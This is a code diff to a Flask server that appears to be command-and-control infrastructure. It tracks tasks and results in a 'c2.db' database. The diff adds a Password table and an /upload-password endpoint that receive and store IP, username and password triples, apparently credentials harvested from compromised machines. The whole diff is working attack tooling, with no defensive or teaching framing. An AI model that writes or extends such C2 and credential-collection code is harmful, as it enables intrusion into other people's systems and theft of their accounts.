@@ -14,7 +14,7 @@ app = Flask(__name__)
 
 
 #Configuration dictionary
-config = {"upload_dir": "uploads", "show_requests": False,"debug":False}
+config = {"upload_dir": "uploads", "show_requests": True,"debug":False}
 
 # SQLite database configuration
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
@@ -46,6 +46,11 @@ class Task(db.Model):
     completed = db.Column(db.Boolean, default=False)
     result = db.Column(db.String(10000), nullable=True,default="NULL")
     returncode = db.Column(db.Integer, nullable=True,default=1234) # Default value to differentiate from actual return codes
+
+class Password(db.Model):
+    ip = db.Column(db.String(15), primary_key=True)
+    password = db.Column(db.String(100), nullable=False)
+    username = db.Column(db.String(100), nullable=False)
 
 # Initialize database
 with app.app_context():
@@ -184,6 +189,24 @@ def upload_file():
         return jsonify({"message": "File uploaded successfully!", "filename": file.filename}), 200
     except:
         return jsonify({"error": "Invalid data"}), 400
+    
+@app.route('/upload-password', methods=['POST'])
+def upload_passwd():
+    data = request.json
+    ip = data.get('ip')
+    username = data.get('username')
+    password = data.get('password')
+    if ip and username and password:
+        if ip not in [passwd.ip for passwd in Password.query.all()] and username not in [passwd.username for passwd in Password.query.all()]:
+            passwd = Password(ip=ip, username=username, password=password)
+            db.session.add(passwd)
+            db.session.commit()
+        else:
+            passwd = Password.query.filter_by(ip=ip).filter_by(username=username).first()
+            passwd.password = password
+            db.session.commit()
+        return jsonify({"message": "Password saved successfully"}), 201
+    return jsonify({"error": "Invalid data"}), 400
 
 
 
